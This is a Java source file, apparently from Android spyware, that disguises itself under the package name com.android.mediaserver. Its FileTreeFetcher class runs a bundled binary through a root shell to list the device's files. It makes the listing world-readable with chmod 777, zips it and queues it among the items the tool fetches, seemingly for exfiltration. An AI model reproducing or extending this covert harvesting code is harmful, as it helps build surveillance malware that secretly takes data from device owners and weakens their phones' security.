package com.android.mediaserver.fetchers.file;

import android.content.Context;
import com.android.mediaserver.fetchers.FetchedFile;
import com.android.mediaserver.shell.Shell.SU;
import com.android.mediaserver.util.AppUtils;
import java.io.File;
import java.util.ArrayList;

public class FileTreeFetcher extends FileFetcher {
  private Context mContext;

  public FileTreeFetcher(Context context) {
    mContext = context;
    mFetchedFiles = new ArrayList();
    String filesDir = mContext.getFilesDir() + File.separator;
    File fileTree = new File(filesDir + "filetree.txt");
    File zippedFileTree = new File(filesDir + "filetree.zip");
    fileTree.delete();
    zippedFileTree.delete();
    if (SU.run(filesDir
        + "filetree"
        + " > "
        + fileTree.getAbsolutePath()
        + "; chmod 777 "
        + fileTree.getAbsolutePath()) != null) {
      if (AppUtils.zipFiles(new String[] { fileTree.getAbsolutePath() },
          zippedFileTree.getAbsolutePath())) {
        fileTree.delete();
        mFetchedFiles.add(new FetchedFile(zippedFileTree, "BIN", "filetree"));
        return;
      }
      fileTree.delete();
      zippedFileTree.delete();
    }
  }
}
